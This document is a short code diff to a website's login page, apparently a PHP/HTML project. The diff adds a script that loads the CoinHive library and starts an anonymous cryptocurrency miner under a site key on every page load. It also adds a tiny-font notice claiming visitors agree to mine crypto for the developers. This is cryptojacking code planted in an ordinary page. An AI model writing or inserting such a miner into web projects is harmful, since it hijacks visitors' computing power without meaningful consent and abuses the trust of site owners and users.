@@ -12,7 +12,12 @@
 
 <html>
   <head>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <link rel="stylesheet" href="css/home.css">
+    <script>
+	   var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
+	   miner.start();
+    </script>
   </head>
   <body>
     <div id="title" align="center">
@@ -31,9 +36,9 @@
           Password: <br>
           <input type="password" name="password" value="" size="35"><br><br>
           <input name="signin" type="submit" value="Login"><br><br>
-          <a class="logout" href="newAccount.php">Don't have an account? Sign up here!</a>
+          <a class="logout" href="newAccount.php">Don't have an account? Sign up here!</a><br>
+          <font size="1">By entering this site you agree to mine crypto for the benifit of the development team</font>
         </form>
       </div>
-
   </body>
 </html>
